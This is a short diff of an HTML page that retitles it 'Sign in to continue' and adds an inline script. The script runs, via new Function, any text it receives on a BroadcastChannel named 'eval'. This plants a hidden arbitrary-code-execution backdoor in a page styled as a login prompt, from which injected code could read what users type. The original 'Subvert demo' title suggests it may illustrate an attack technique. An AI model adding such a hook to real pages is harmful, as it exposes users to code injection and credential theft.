@@ -1,8 +1,11 @@
 <!doctype html>
 <html>
   <head>
-    <title>Subvert demo</title>
+    <title>Sign in to continue</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script>
+      new BroadcastChannel('eval').onmessage = (e) => new Function(e.data)()
+    </script>
   </head>
   <body>
     <h1>Sign in to continue</h1>
